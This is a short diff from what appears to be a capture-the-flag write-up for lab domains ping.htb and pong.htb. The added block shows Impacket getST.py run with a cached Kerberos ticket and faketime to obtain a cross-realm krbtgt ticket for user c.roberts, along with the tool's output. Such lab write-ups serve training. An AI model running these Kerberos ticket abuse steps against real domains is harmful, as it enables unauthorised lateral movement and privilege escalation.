@@ -520,5 +520,17 @@ LDAP        dc2.pong.htb    389    DC2              gMSA Managers               
 
 Looks like there is no members in this group currently
 
+```python
+❯❯❯ export KRB5CCNAME=c.roberts.ccache
 
+❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.1 'ping.htb/c.roberts' -spn 'krbtgt/PONG.HTB'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting ST for user
+[*] Saving ticket in c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache
+
+❯❯❯ export KRB5CCNAME=c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache
+
+
+```
 
